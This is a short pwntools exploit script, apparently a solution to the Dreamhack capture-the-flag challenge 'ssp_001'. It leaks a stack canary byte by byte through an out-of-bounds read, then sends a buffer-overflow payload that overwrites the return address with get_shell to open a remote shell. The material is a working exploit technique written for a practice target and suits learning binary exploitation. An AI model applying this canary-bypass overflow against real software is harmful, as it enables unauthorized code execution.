from pwn import *

p = remote("host3.dreamhack.games", 13858)
e = ELF("./ssp_001")

# get_shell 함수 주소 파악

get_shell_addr = e.symbols["get_shell"]

# Canary leak

p.recvuntil("> ")

def canary_leak(idx):
	p.sendline(b"P")
	
	p.recvuntil(": ")
	p.sendline(str(idx))

	p.recvuntil("is : ")
	return p.recv()[:2]

canary = b"0x"
canary += canary_leak(131)
canary += canary_leak(130)
canary += canary_leak(129)
canary += canary_leak(128)

canary = int(canary, 16)

# payload  구성

payload = b"\x41" * 64 # dummy @ name
payload += p32(canary) # 알아낸 canary @ canary
payload += b"\x41" * 8 # dummy @ dummy, SFP
payload += p32(get_shell_addr) # get_shell 함수의 주소 @ return address

# payload 전송

p.sendline("E")

p.recvuntil("Size : ")
p.sendline(str(len(payload)))

p.recvuntil("Name : ")
p.sendline(payload)

p.interactive()